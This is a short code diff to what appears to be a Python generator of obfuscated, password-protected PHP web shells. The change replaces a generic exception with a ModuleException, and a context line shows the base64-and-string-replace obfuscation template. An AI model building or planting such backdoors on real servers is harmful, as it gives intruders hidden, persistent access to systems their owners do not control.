@@ -20,6 +20,7 @@
 import base64, codecs
 from random import random, randrange, choice, shuffle
 from pollution import random_string, pollute_with_static_str
+from module import ModuleException
 
 class Backdoor:
 
@@ -49,7 +50,7 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 	def __init__( self, password ):
 		
 		if len(password)<4:
-			raise Exception('Password \'%s\' too short, choose another one' % password)
+			raise ModuleException('generate','Password \'%s\' too short, choose another one' % password)
 		
 		self.password  = password
 		self.start_key = self.password[:2]
